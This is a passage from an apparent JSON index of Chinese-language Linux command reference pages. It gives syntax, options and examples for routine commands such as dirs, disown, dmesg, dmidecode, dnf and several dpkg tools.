清空目录堆栈。\n-l    堆栈内以~开头的目录在显示时展开。\n-p    将目录堆栈内的每一个目录按行显示。\n-v    将目录堆栈内的每一个目录按行显示并在每行前加上堆栈内的位置编号。\n```\n\n## 参数\n\n+N（可选）：不带参数执行`dirs`命令显示的列表中，左起的第N个目录将被显示。（从0开始计数）\n\n-N（可选）：不带参数执行`dirs`命令显示的列表中，右起的第N个目录将被显示。（从0开始计数）\n\n## 返回值\n\n返回成功除非提供了非法选项或执行出现错误。\n\n## 例子\n\n```shell\n# 添加目录到堆栈。\n[user2@pc ~]$ dirs\n~\n[user2@pc ~]$ pushd -n ~/Desktop\n~ ~/Desktop\n[user2@pc ~]$ pushd -n ~/Pictures\n~ ~/Pictures ~/Desktop\n[user2@pc ~]$ pushd -n ~/bin\n~ ~/bin ~/Pictures ~/Desktop\n\n# 选项和参数的示例：\n[user2@pc ~]$ dirs -l\n/home/user2 /home/user2/bin /home/user2/Pictures /home/user2/Desktop\n[user2@pc ~]$ dirs -p\n~\n~/bin\n~/Pictures\n~/Desktop\n[user2@pc ~]$ dirs -v\n 0  ~\n 1  ~/bin\n 2  ~/Pictures\n 3  ~/Desktop\n[user2@pc ~]$ dirs +2\n~/Pictures\n[user2@pc ~]$ dirs -2\n~/bin\n[user2@pc ~]$ dirs -c\n[user2@pc ~]$ dirs\n~\n```\n\n### 注意\n\n1. `bash`的目录堆栈命令包括`dirs popd pushd`。\n2. 当前目录始终是目录堆栈的顶部。\n3. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dirs"]},{"title":"【Linux 命令】disown","url":"/linux-command/disown/","content":"\n从当前的shell中移除作业。\n\n## 概要\n\n```shell\ndisown [-h] [-ar] [jobspec ... | pid ...]\n```\n\n## 主要用途\n\n- 从当前shell的作业列表中移除全部作业。\n\n- 从当前shell的作业列表中移除指定的一到多个作业。\n\n- 从当前shell的作业列表中移除正在运行的作业。\n\n- 标记作业，使得它们在当前shell退出后也不会结束。\n\n\n## 选项\n\n```shell\n-h    标记每个作业标识符，这些作业将不会在shell接收到sighup信号时接收到sighup信号。\n-a    移除所有的作业。\n-r    移除运行的作业。\n```\n\n## 参数\n\njobspec（可选）：要移除的作业标识符，可以是一到多个。\n\npid（可选）：要移除的作业对应的进程ID，可以是一到多个。\n\n\n## 返回值\n\n返回成功除非未开启作业控制或执行出现错误。\n\n## 例子\n\n```shell\n# 演示。\n[user2@pc] ssh 192.168.1.4\nuser2@192.168.1.4's password:\n# 此时按下ctrl+z使得交互停止。\n[1]+  Stopped                 ssh 192.168.1.4\n\n[user2@pc] ssh 192.168.1.7\nuser2@192.168.1.7's password:\n# 此时按下ctrl+z使得交互停止。\n[1]+  Stopped                 ssh 192.168.1.7\n\n[user2@pc] sleep 120 &\n[3] 28986\n\n# 列出作业及pid信息。\n[user2@pc] jobs -l\n[1]- 28756 Stopped                 ssh 192.168.1.4\n[2]+ 28833 Stopped                 ssh 192.168.1.7\n[3]  28986 Running                 sleep 120 &\n\n# 删除运行状态的作业。\n[user2@pc] disown -r\n\n[user2@pc] jobs -l\n[1]- 28756 Stopped                 ssh 192.168.1.4\n[2]+ 28833 Stopped                 ssh 192.168.1.7\n\n# 注意disown只是移除作业，并没有停止。\n[user2@pc] pgrep -a -u user2 -f 'sleep 120'\n28986 sleep 120\n\n# 删除指定的作业。\n[user2@pc] disown %2\nbash: warning: deleting stopped job 2 with process group 28833\n\n[user2@pc] jobs -l\n[1]- 28756 Stopped                 ssh 192.168.1.4\n\n# 注意disown只是移除作业，并没有停止。\n[user2@pc] pgrep -a -u user2 -f 'ssh 192.168.1.7'\n28833 ssh 192.168.1.7\n\n# 删除全部作业。\n[user2@pc] disown -a\nbash: warning: deleting stopped job 1 with process group 28756\n\n[user2@pc] jobs -l\n\n# 注意disown只是移除作业，并没有停止。\n[user2@pc] pgrep -a -u user2 -f 'ssh 192.168.1.4'\n28756 ssh 192.168.1.4\n```\n\n```shell\n# 演示-h选项的作用。\n[user2@pc] sleep 90 &\n[1] 109080\n\n[user2@pc] jobs -l\n[1]+ 109080 Running                 sleep 90 &\n\n[user2@pc] disown -h %1\n\n[user2@pc] exit\n\n# 此时前一个终端已经关闭，现在打开新终端查找该作业。\n[user2@pc] pgrep -a -u user2 -f 'sleep 90'\n109080 sleep 90\n```\n\n### 注意\n\n1. `bash`的作业控制命令包括`bg fg kill wait disown suspend`。\n2. 该命令需要`set`选项`monitor`处于开启状态时才能执行；查看作业控制状态：输入`set -o`查看`monitor`行；执行`set -o monitor`或`set -m`开启该选项。\n3. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n### 参考链接\n\n- [disown的用法](https://www.cyberciti.biz/faq/unix-linux-disown-command-examples-usage-syntax/)\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","disown"]},{"title":"【Linux 命令】dmesg","url":"/linux-command/dmesg/","content":"\n显示Linux系统启动信息\n\n## 补充说明\n\n**dmesg命令** 被用于检查和控制内核的环形缓冲区。kernel会将开机信息存储在ring buffer中。您若是开机时来不及查看信息，可利用dmesg来查看。开机信息保存在`/var/log/dmesg`文件里。\n\n###  语法 \n\n```shell\ndmesg(选项)\n```\n\n###  选项 \n\n```shell\n-c：显示信息后，清除ring buffer中的内容；\n-s<缓冲区大小>：预设置为8196，刚好等于ring buffer的大小；\n-n：设置记录信息的层级。\n```\n\n###  实例 \n\n```shell\n[root@localhost ~]# dmesg | head\nLinux version 2.6.18-348.6.1.el5 (mockbuild@builder17.centos.org) (gcc version 4.1.2 20080704 (Red Hat 4.1.2-54)) #1 SMP Tue May 21 15:34:22 EDT 2013\nBIOS-provided physical RAM map:\n BIOS-e820: 0000000000010000 - 000000000009f400 (usable)\n BIOS-e820: 000000000009f400 - 00000000000a0000 (reserved)\n BIOS-e820: 00000000000f0000 - 0000000000100000 (reserved)\n BIOS-e820: 0000000000100000 - 000000007f590000 (usable)\n BIOS-e820: 000000007f590000 - 000000007f5e3000 (ACPI NVS)\n BIOS-e820: 000000007f5e3000 - 000000007f5f0000 (ACPI data)\n BIOS-e820: 000000007f5f0000 - 000000007f600000 (reserved)\n BIOS-e820: 00000000e0000000 - 00000000e8000000 (reserved)\n```\n\n查看硬盘基础信息\n\n```shell\ndmesg | grep sda\n\n[    2.442555] sd 0:0:0:0: [sda] 488281250 512-byte logical blocks: (250 GB/232 GiB)\n[    2.442590] sd 0:0:0:0: [sda] Write Protect is off\n[    2.442592] sd 0:0:0:0: [sda] Mode Sense: 00 3a 00 00\n[    2.442607] sd 0:0:0:0: [sda] Write cache: enabled, read cache: enabled, doesn't support DPO or FUA\n[    2.447533]  sda: sda1\n[    2.448503] sd 0:0:0:0: [sda] Attached SCSI disk\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dmesg"]},{"title":"【Linux 命令】dmidecode","url":"/linux-command/dmidecode/","content":"\n在Linux系统下获取有关硬件方面的信息\n\n## 补充说明\n\n**dmidecode命令** 可以让你在Linux系统下获取有关硬件方面的信息。dmidecode的作用是将DMI数据库中的信息解码，以可读的文本方式显示。由于DMI信息可以人为修改，因此里面的信息不一定是系统准确的信息。dmidecode遵循SMBIOS/DMI标准，其输出的信息包括BIOS、系统、主板、处理器、内存、缓存等等。\n\nDMI（Desktop Management Interface,DMI）就是帮助收集电脑系统信息的管理系统，DMI信息的收集必须在严格遵照SMBIOS规范的前提下进行。SMBIOS（System Management BIOS）是主板或系统制造者以标准格式显示产品管理信息所需遵循的统一规范。SMBIOS和DMI是由行业指导机构Desktop Management Task Force(DMTF)起草的开放性的技术标准，其中DMI设计适用于任何的平台和操作系统。\n\nDMI充当了管理工具和系统层之间接口的角色。它建立了标准的可管理系统更加方便了电脑厂商和用户对系统的了解。DMI的主要组成部分是Management Information Format(MIF)数据库。这个数据库包括了所有有关电脑系统和配件的信息。通过DMI，用户可以获取序列号、电脑厂商、串口信息以及其它系统配件信息。\n\n###  语法 \n\n```shell\ndmidecode [选项]\n```\n\n###  选项 \n\n```shell\n-d：(default:/dev/mem)从设备文件读取信息，输出内容与不加参数标准输出相同。\n-h：显示帮助信息。\n-s：只显示指定DMI字符串的信息。(string)\n-t：只显示指定条目的信息。(type)\n-u：显示未解码的原始条目内容。\n--dump-bin file：将DMI数据转储到一个二进制文件中。\n--from-dump FILE：从一个二进制文件读取DMI数据。\n-V：显示版本信息。\n```\n\n **dmidecode参数string及type列表：** \n\n（1）Valid string keywords are：\n\n*   bios-vendor\n*   bios-version\n*   bios-release-date\n*   system-manufacturer\n*   system-product-name\n*   system-version\n*   system-serial-number\n*   system-uuid\n*   baseboard-manufacturer\n*   baseboard-product-name\n*   baseboard-version\n*   baseboard-serial-number\n*   baseboard-asset-tag\n*   chassis-manufacturer\n*   chassis-type\n*   chassis-version\n*   chassis-serial-number\n*   chassis-asset-tag\n*   processor-family\n*   processor-manufacturer\n*   processor-version\n*   processor-frequency\n\n（2）Valid type keywords are：\n\n*   bios\n*   system\n*   baseboard\n*   chassis\n*   processor\n*   memory\n*   Cache\n*   connector\n*   slot\n\n（3）type全部编码列表：\n\n*   BIOS\n*   System\n*   Base Board\n*   Chassis\n*   Processor\n*   Memory Controller\n*   Memory Module\n*   Cache\n*   Port Connector\n*   System Slots\n*   On Board Devices\n*   OEM Strings\n*   System Configuration Options\n*   BIOS Language\n*   Group Associations\n*   System Event Log\n*   Physical Memory Array\n*   Memory Device\n*   32-bit Memory Error\n*   Memory Array Mapped Address\n*   Memory Device Mapped Address\n*   Built-in Pointing Device\n*   Portable Battery\n*   System Reset\n*   Hardware Security\n*   System Power Controls\n*   Voltage Probe\n*   Cooling Device\n*   Temperature Probe\n*   Electrical Current Probe\n*   Out-of-band Remote Access\n*   Boot Integrity Services\n*   System Boot\n*   64-bit Memory Error\n*   Management Device\n*   Management Device Component\n*   Management Device Threshold Data\n*   Memory Channel\n*   IPMI Device\n*   Power Supply\n*   Additional Information\n*   Onboard Device\n\n###  实例 \n\n```shell\ndmidecode -t 1  # 查看服务器信息\ndmidecode | grep 'Product Name' # 查看服务器型号 \ndmidecode |grep 'Serial Number' # 查看主板的序列号 \ndmidecode -t 2  # 查看主板信息\ndmidecode -s system-serial-number # 查看系统序列号 \ndmidecode -t memory # 查看内存信息 \ndmidecode -t 11 # 查看OEM信息 \ndmidecode -t 17 # 查看内存条数\ndmidecode -t 16 # 查询内存信息\ndmidecode -t 4  # 查看CPU信息\n\ncat /proc/scsi/scsi # 查看服务器硬盘信息\n```\n\n不带选项执行dmidecode命令通常会输出所有的硬件信息。dmidecode命令有个很有用的选项-t，可以按指定类型输出相关信息，假如要获得处理器方面的信息，则可以执行：\n\n```shell\n[root@localhost ~]# dmidecode -t processor\n# dmidecode 2.11\nSMBIOS 2.5 present.\n\nHandle 0x0001, DMI type 4, 40 bytes\nProcessor Information\n        Socket Designation: Node 1 Socket 1\n        Type: Central Processor\n        Family: Xeon MP\n        Manufacturer: Intel(R) Corporation\n        id: C2 06 02 00 FF FB EB BF\n        Signature: Type 0, Family 6, Model 44, Stepping 2\n        Flags:\n                FPU (Floating-point unit on-chip)\n                VME (Virtual mode extension)\n                DE (Debugging extension)\n                PSE (Page size extension)\n                TSC (time stamp counter)\n                MSR (Model specific registers)\n                PAE (Physical address extension)\n                MCE (Machine check exception)\n                CX8 (CMPXCHG8 instruction supported)\n                APIC (On-chip APIC hardware supported)\n                SEP (Fast system call)\n                MTRR (Memory type range registers)\n                PGE (Page global enable)\n                MCA (Machine check architecture)\n                CMOV (Conditional move instruction supported)\n                PAT (Page attribute table)\n                PSE-36 (36-bit page size extension)\n                CLFSH (CLFLUSH instruction supported)\n                DS (Debug store)\n                ACPI (ACPI supported)\n                MMX (MMX technology supported)\n                FXSR (FXSAVE and FXSTOR instructions supported)\n                SSE (Streaming SIMD extensions)\n                SSE2 (Streaming SIMD extensions 2)\n                ss (Self-snoop)\n                HTT (Multi-threading)\n                TM (Thermal monitor supported)\n                PBE (Pending break enabled)\n        Version: Intel(R) Xeon(R) CPU           E5620  @ 2.40GHz\n        Voltage: 1.2 V\n        External Clock: 5866 MHz\n        Max Speed: 4400 MHz\n        Current Speed: 2400 MHz\n        Status: Populated, Enabled\n        Upgrade: ZIF Socket\n        L1 Cache Handle: 0x0002\n        L2 Cache Handle: 0x0003\n        L3 Cache Handle: 0x0004\n        Serial Number: Not Specified\n        Asset Tag: Not Specified\n        Part Number: Not Specified\n        Core Count: 4\n        Core Enabled: 4\n        Thread Count: 8\n        Characteristics:\n                64-bit capable\n\nHandle 0x0055, DMI type 4, 40 bytes\nProcessor Information\n        Socket Designation: Node 1 Socket 2\n        Type: Central Processor\n        Family: Xeon MP\n        Manufacturer: Not Specified\n        ID: 00 00 00 00 00 00 00 00\n        Signature: Type 0, Family 0, Model 0, Stepping 0\n        Flags: None\n        Version: Not Specified\n        Voltage: 1.2 V\n        External Clock: 5866 MHz\n        Max Speed: 4400 MHz\n        Current Speed: Unknown\n        Status: Unpopulated\n        Upgrade: ZIF Socket\n        L1 Cache Handle: Not Provided\n        L2 Cache Handle: Not Provided\n        L3 Cache Handle: Not Provided\n        Serial Number: Not Specified\n        Asset Tag: Not Specified\n        Part Number: Not Specified\n        Characteristics: None\n```\n\n查看内存的插槽数，已经使用多少插槽。每条内存多大，已使用内存多大\n\n```shell\ndmidecode|grep -P -A5 \"Memory\\s+Device\"|grep Size|grep -v Range \n\n#   Size: 2048 MB\n#   Size: 2048 MB\n#   Size: 4096 MB\n#   Size: No Module Installed\n```\n\n查看内存支持的最大内存容量\n\n```shell\ndmidecode|grep -P 'Maximum\\s+Capacity'\n\n#  Maximum Capacity: 16 GB\n```\n\n查看内存的频率\n\n```shell\ndmidecode|grep -A16 \"Memory Device\"\n\n#   Memory Device\n#     Array Handle: 0x1000\n#     Error Information Handle: Not Provided\n#     Total Width: 72 bits\n#     Data Width: 64 bits\n#     Size: 2048 MB\n#     Form Factor: DIMM\n#     Set: 1\n#     Locator: DIMM_A1\n#     Bank Locator: Not Specified\n#     Type: DDR3\n#     Type Detail: Synchronous Unbuffered (Unregistered)\n#     Speed: 1333 MHz\n#     Manufacturer: 00CE000080CE\n#     Serial Number: 4830F3E1\n#     Asset Tag: 01093200\n#     Part Number: M391B5673EH1-CH9\n#   --\n#   Memory Device\n#     Array Handle: 0x1000\n#     Error Information Handle: Not Provided\n#     Total Width: 72 bits\n#     Data Width: 64 bits\n#     Size: 2048 MB\n#     Form Factor: DIMM\n#     Set: 1\n#     Locator: DIMM_A2\n#     Bank Locator: Not Specified\n#     Type: DDR3\n#     Type Detail: Synchronous Unbuffered (Unregistered)\n#     Speed: 1333 MHz\n#     Manufacturer: 00AD000080AD\n#     Serial Number: 1BA1F0B5\n#     Asset Tag: 01110900\n#     Part Number: HMT325U7BFR8C-H9\n#   --\n\ndmidecode|grep -A16 \"Memory Device\"|grep 'Speed'\n\n#  Speed: 1333 MHz\n#  Speed: 1333 MHz\n#  Speed: 1333 MHz\n#  Speed: Unknown\n\n```shell\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dmidecode"]},{"title":"【Linux 命令】dnf","url":"/linux-command/dnf/","content":"\n新一代的RPM软件包管理器\n\n## 补充说明\n\n**DNF** 是新一代的rpm软件包管理器。他首先出现在 Fedora 18 这个发行版中。而最近，它取代了yum，正式成为 Fedora 22 的包管理器。\n\nDNF包管理器克服了YUM包管理器的一些瓶颈，提升了包括用户体验，内存占用，依赖分析，运行速度等多方面的内容。DNF使用 RPM, libsolv 和 hawkey 库进行包管理操作。尽管它没有预装在 CentOS 和 RHEL 7 中，但你可以在使用 YUM 的同时使用 DNF 。你可以在这里获得关于 DNF 的更多知识：《 DNF 代替 YUM ，你所不知道的缘由》\n\nDNF 的最新稳定发行版版本号是 1.0，发行日期是2015年5月11日。 这一版本的额 DNF 包管理器（包括在他之前的所有版本） 都大部分采用 Python 编写，发行许可为GPL v2.\n\n###  安装 DNF 包管理器\n\nDNF 并未默认安装在 RHEL 或 CentOS 7系统中，但是 Fedora 22 已经默认使用 DNF .\n\n1、为了安装 DNF ，您必须先安装并启用 epel-release 依赖。\n\n在系统中执行以下命令：\n\n```shell\nyum install epel-release\n```\n\n或者\n\n```shell\nyum install epel-release -y\n```\n\n其实这里并没有强制使用”-y”的理由，相反的，在不使用”-y”的情况下，用户可以在安装过程中查看到底有哪些东西被安装进了系统。但对于没有这个需求的用户，您可以在 YUM 中使用”-y”参数来自动安装所有东西。\n\n2、使用 epel-release 依赖中的 YUM 命令来安装 DNF 包。在系统中执行以下命令：\n\n```shell\nyum install dnf\n```\n\n然后， DNF 包管理器就被成功的安装到你的系统中了。接下来，是时候开始我们的教程了！在这个教程中，您将会学到27个用于 DNF 包管理器的命令。使用这些命令，你可以方便有效的管理您系统中的 RPM 软件包。现在，让我们开始学习 DNF 包管理器的27条常用命令吧！\n\n**查看 DNF 包管理器版本** \n\n用处：该命令用于查看安装在您系统中的 DNF 包管理器的版本\n\n```shell\ndnf –version\n```\n\n!Check-DNF-Version\n\n**查看系统中可用的 DNF 软件库** \n\n用处：该命令用于显示系统中可用的 DNF 软件库\n\n```shell\ndnf repolist\n```\n\n**查看系统中可用和不可用的所有的 DNF 软件库** \n\n用处：该命令用于显示系统中可用和不可用的所有的 DNF 软件库\n\n```shell\ndnf repolist all\n```\n\n**列出所有 RPM 包** \n\n用处：该命令用于列出用户系统上的所有来自软件库的可用软件包和所有已经安装在系统上的软件包\n\n```shell\ndnf list\n```\n\n**列出所有安装了的 RPM 包** \n\n用处：该命令用于列出所有安装了的 RPM 包\n\n```shell\ndnf list installed\n```\n\n**列出所有可供安装的 RPM 包** \n\n用处：该命令用于列出来自所有可用软件库的可供安装的软件包\n\n```shell\ndnf list available\n```\n\n**搜索软件库中的 RPM 包** \n\n用处：当你不知道你想要安装的软件的准确名称时，你可以用该命令来搜索软件包。你需要在”search”参数后面键入软件的部分名称来搜索。（在本例中我们使用”nano”）\n\n```shell\ndnf search nano\n```\n\n**查找某一文件的提供者** \n\n用处：当你想要查看是哪个软件包提供了系统中的某一文件时，你可以使用这条命令。（在本例中，我们将查找”/bin/bash”这个文件的提供者）\n\n```shell\ndnf provides /bin/bash\n```\n\n**查看软件包详情** \n\n用处：当你想在安装某一个软件包之前查看它的详细信息时，这条命令可以帮到你。（在本例中，我们将查看”nano”这一软件包的详细信息）\n\n```shell\ndnf info nano\n```\n\n**安装软件包** \n\n用处：使用该命令，系统将会自动安装对应的软件及其所需的所有依赖（在本例中，我们将用该命令安装nano软件）\n\n```shell\ndnf install nano\n```\n\n**升级软件包** \n\n用处：该命令用于升级制定软件包（在本例中，我们将用命令升级”systemd”这一软件包）\n\n```shell\ndnf update systemd\n```\n\n**检查系统软件包的更新** \n\n用处：该命令用于检查系统中所有软件包的更新\n\n```shell\ndnf check-update\n```\n\n**升级所有系统软件包** \n\n用处：该命令用于升级系统中所有有可用升级的软件包\n\n```shell\ndnf update 或 dnf upgrade\n```\n\n**删除软件包** \n\n用处：删除系统中指定的软件包（在本例中我们将使用命令删除”nano”这一软件包）\n\n```shell\ndnf remove nano 或 dnf erase nano\n```\n\n**删除无用孤立的软件包** \n\n用处：当没有软件再依赖它们时，某一些用于解决特定软件依赖的软件包将会变得没有存在的意义，该命令就是用来自动移除这些没用的孤立软件包。\n\n```shell\ndnf autoremove\n```\n\n**删除缓存的无用软件包** \n\n用处：在使用 DNF 的过程中，会因为各种原因在系统中残留各种过时的文件和未完成的编译工程。我们可以使用该命令来删除这些没用的垃圾文件。\n\n```shell\ndnf clean all\n```\n\n**获取有关某条命令的使用帮助** \n\n用处：该命令用于获取有关某条命令的使用帮助（包括可用于该命令的参数和该命令的用途说明）（本例中我们将使用命令获取有关命令”clean”的使用帮助）\n\n```shell\ndnf help clean\n```\n\n**查看所有的 DNF 命令及其用途** \n\n用处：该命令用于列出所有的 DNF 命令及其用途\n\n```shell\ndnf help\n```\n\n**查看 DNF 命令的执行历史** \n\n用处：您可以使用该命令来查看您系统上 DNF 命令的执行历史。通过这个手段您可以知道在自您使用 DNF 开始有什么软件被安装和卸载。\n\n```shell\ndnf history\n```\n\n**查看所有的软件包组** \n\n用处：该命令用于列出所有的软件包组\n\n```shell\ndnf grouplist\n```\n\n**安装一个软件包组** \n\n用处：该命令用于安装一个软件包组（本例中，我们将用命令安装”Educational Software”这个软件包组）\n\n```shell\ndnf groupinstall ‘Educational Software’\n```\n\n**升级一个软件包组中的软件包** \n\n用处：该命令用于升级一个软件包组中的软件包（本例中，我们将用命令升级”Educational Software”这个软件包组中的软件）\n\n```shell\ndnf groupupdate ‘Educational Software’\n```\n\n**删除一个软件包组** \n\n用处：该命令用于删除一个软件包组（本例中，我们将用命令删除”Educational Software”这个软件包组）\n\n```shell\ndnf groupremove ‘Educational Software’\n```\n\n**从特定的软件包库安装特定的软件** \n\n用处：该命令用于从特定的软件包库安装特定的软件（本例中我们将使用命令从软件包库 epel 中安装 phpmyadmin 软件包）\n\n```shell\ndnf –enablerepo=epel install phpmyadmin\n```\n\n**更新软件包到最新的稳定发行版** \n\n用处：该命令可以通过所有可用的软件源将已经安装的所有软件包更新到最新的稳定发行版\n\n```shell\ndnf distro-sync\n```\n\n**重新安装特定软件包** \n\n用处：该命令用于重新安装特定软件包（本例中，我们将使用命令重新安装”nano”这个软件包）\n\n```shell\ndnf reinstall nano\n```\n\n**回滚某个特定软件的版本** \n\n用处：该命令用于降低特定软件包的版本（如果可能的话）（本例中，我们将使用命令降低”acpid”这个软件包的版本）\n\n```shell\ndnf downgrade acpid\n```\n\n样例输出：\n\n```shell\nUsing metadata from Wed May 20 12:44:59 2015\nNo match for available package: acpid-2.0.19-5.el7.x86_64\nError: Nothing to do.\n```\n\n原作者注：在执行这条命令的时候， DNF 并没有按照我期望的那样降级指定的软件（“acpid”）。该问题已经上报。\n\n###  总结\n\nDNF 包管理器作为 YUM 包管理器的升级替代品，它能自动完成更多的操作。但在我看来，正因如此，所以 DNF 包管理器不会太受那些经验老道的 Linux 系统管理者的欢迎。举例如下：\n\n1.  在 DNF 中没有 –skip-broken 命令，并且没有替代命令供选择。\n2.  在 DNF 中没有判断哪个包提供了指定依赖的 resolvedep 命令。\n3.  在 DNF 中没有用来列出某个软件依赖包的 deplist 命令。\n4.  当你在 DNF 中排除了某个软件库，那么该操作将会影响到你之后所有的操作，不像在 YUM 下那样，你的排除操作只会咋升级和安装软件时才起作用。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dnf"]},{"title":"【Linux 命令】dnsdomainname","url":"/linux-command/dnsdomainname/","content":"\n定义DNS系统中FQDN名称的域名\n\n## 补充说明\n\n**dnsdomainname命令** 用于定义DNS系统中FQDN名称中的域名。\n\n###  语法\n\n```shell\ndnsdomainname(选项)\n```\n\n###  选项\n\n```shell\n-v：详细信息模式，输出指令执行的详细信息。\n```\n\n###  实例\n\n```shell\n[root@AY1307311912260196fcZ ~]# dnsdomainname -v\ngethostname()=`AY1307311912260196fcZ'\nResolving `AY1307311912260196fcZ' ...\nResult: h_name=`AY1307311912260196fcZ'\nResult: h_addr_list=`10.160.7.81'\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dnsdomainname"]},{"title":"【Linux 命令】domainname","url":"/linux-command/domainname/","content":"\n显示和设置系统的NIS域名\n\n## 补充说明\n\n**domainname命令** 用于显示和设置系统的NIS域名。\n\n###  语法\n\n```shell\ndomainname(选项)(参数)\n```\n\n###  选项\n\n```shell\n-v：详细信息模式；\n-F：指定读取域名信息的文件。\n```\n\n###  参数\n\nNIS域名：指定要设置的NIS域名。\n\n###  实例\n\n```shell\n[root@AY1307311912260196fcZ ~]# domainname -v\ngetdomainname()=`(none)'\n(none)\n [root@AY1307311912260196fcZ ~]# domainname\nwww.jsdig.com\n\n[root@AY1307311912260196fcZ ~]# domainname -v\ngetdomainname()=`www.jsdig.com'\nwww.jsdig.com\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","domainname"]},{"title":"【Linux 命令】dos2unix","url":"/linux-command/dos2unix/","content":"\n将DOS格式文本文件转换成Unix格式\n\n## 补充说明\n\n**dos2unix命令** 用来将DOS格式的文本文件转换成UNIX格式的（DOS/MAC to UNIX text file format converter）。DOS下的文本文件是以`\\r\\n`作为断行标志的，表示成十六进制就是0D 0A。而Unix下的文本文件是以\\n作为断行标志的，表示成十六进制就是0A。DOS格式的文本文件在Linux底下，用较低版本的vi打开时行尾会显示`^M`，而且很多命令都无法很好的处理这种格式的文件，如果是个shell脚本，。而Unix格式的文本文件在Windows下用Notepad打开时会拼在一起显示。因此产生了两种格式文件相互转换的需求，对应的将UNIX格式文本文件转成成DOS格式的是unix2dos命令。\n\n### 语法\n\n```shell\ndos2unix [-hkqV] [-c convmode] [-o file ...] [-n infile outfile ...]\n```\n\n### 选项\n\n```shell\n-k：保持输出文件的日期不变\n-q：安静模式，不提示任何警告信息。\n-V：查看版本\n-c：转换模式，模式有：ASCII, 7bit, ISO, Mac, 默认是：ASCII。\n-o：写入到源文件\n-n：写入到新文件\n```\n\n### 参数\n\n参数：需要转换到文件。\n\n### 实例\n\n最简单的用法就是dos2unix直接跟上文件名：\n\n```shell\ndos2unix file\n```\n\n如果一次转换多个文件，把这些文件名直接跟在dos2unix之后。（注：也可以加上`-o`参数，也可以不加，效果一样）\n\n```shell\ndos2unix file1 file2 file3\ndos2unix -o file1 file2 file3\n```\n\n上面在转换时，都会直接在原来的文件上修改，如果想把转换的结果保存在别的文件，而源文件不变，则可以使用`-n`参数。\n\n```shell\ndos2unix oldfile newfile\n```\n\n如果要保持文件时间戳不变，加上`-k`参数。所以上面几条命令都是可以加上`-k`参数来保持文件时间戳的。\n\n```shell\ndos2unix -k file\ndos2unix -k file1 file2 file3\ndos2unix -k -o file1 file2 file3\ndos2unix -k -n oldfile newfile\n```\n\n转换当前目录下所有文件\n\n```shell\nfind -type f | xargs dos2unix\n```\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dos2unix"]},{"title":"【Linux 命令】dpkg-deb","url":"/linux-command/dpkg-deb/","content":"\nDebian Linux下的软件包管理工具\n\n## 补充说明\n\n**dpkg-deb命令** 是Debian Linux下的软件包管理工具，它可以对软件包执行打包和解包操作以及提供软件包信息。\n\n###  语法\n\n```shell\ndpkg-deb(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c：显示软件包中的文件列表；\n-e：将主控信息解压；\n-f：把字段内容打印到标准输出；\n-x：将软件包中的文件释放到指定目录下；\n-X：将软件包中的文件释放到指定目录下，并显示释放文件的详细过程；\n-w：显示软件包的信息；\n-l：显示软件包的详细信息；\n-R：提取控制信息和存档的清单文件；\n-b：创建debian软件包。\n```\n\n###  参数\n\n文件：指定要操作的“.deb”软件包的全名或软件名。\n\n###  实例\n\n解压程序文件：\n\n```shell\ndpkg-deb -x drcom-pum_1.0-0ubuntu1~ppa1~jaunty1_i386.deb drcom\n```\n\n解压控制文件：\n\n```shell\ndpkg-deb -e drcom-pum_1.0-0ubuntu1~ppa1~jaunty1_i386.deb drcom/DEBIAN\n```\n\n打包生成deb文件：\n\n```shell\ndpkg-deb -b drcom drcom_1.4.8.2_i386.deb\n```\n\n查询deb包中的文件内容：\n\n```shell\ndpkg-deb -c demo.deb\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dpkg-deb"]},{"title":"【Linux 命令】dpkg-divert","url":"/linux-command/dpkg-divert/","content":"\nDebian Linux中创建并管理一个转向列表\n\n## 补充说明\n\n**dpkg-divert命令** 是Debian Linux中创建并管理一个转向（diversion）列表，其使得安装文件的默认位置失效的工具。\n\n###  语法\n\n```shell\ndpkg-divert(选项)(参数)\n```\n\n###  选项\n\n```shell\n--add：添加一个转移文件；\n--remove：删除一个转移文件；\n--list：列出匹配的转移；\n--truename：对应转移文件真实文件名；\n--quidet：安静模式。\n```\n\n###  参数\n\n文件：指定转移文件名。\n\n###  实例\n\n指定软件包wibble安装时，写入`/usr/bin/example.foo`，而不是`/usr/bin/example`：\n\n```shell\ndpkg-divert --package wibble --divert /usr/bin/example.foo --rename /usr/bin/example\n```\n\n指定软件包wibble安装时，删除对`/usr/bin/example`的转移修改：\n\n```shell\ndpkg-divert --package wibble --rename --remove /usr/bin/example\n```\n\n删除对`/usr/bin/example`的转移修改：\n\n```shell\ndpkg-divert --rename --remove /usr/bin/example\n```\n\n添加一个软件包安装时，写入`/usr/bin/example.foo`，而不是`/usr/bin/example`的修改：\n\n```shell\ndpkg-divert --divert /usr/bin/example.foo --rename /usr/bin/example\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dpkg-divert"]},{"title":"【Linux 命令】dpkg-preconfigure","url":"/linux-command/dpkg-preconfigure/","content":"\nDebian Linux中软件包安装之前询问问题\n\n## 补充说明\n\n**dpkg-preconfigure命令** 用于在Debian Linux中软件包安装之前询问问题。\n\n###  语法\n\n```shell\ndpkg-preconfigure(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：选择使用的前端；\n-p：感兴趣的最低的优先级问题；\n--apt：在apt模式下运行。\n```\n\n###  参数\n\n软件包：指定“.deb”软件包。\n\n###  实例\n\n导入debconf模板：\n\n```shell\ndpkg-preconfigure /var/cache/apt/archives/mysql-server-5.5*.deb\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dpkg-preconfigure"]},{"title":"【Linux 命令】dpkg-query","url":"/linux-command/dpkg-query/","content":"\nDebian Linux中软件包的查询工具\n\n## 补充说明\n\n**dpkg-query命令** 是Debian 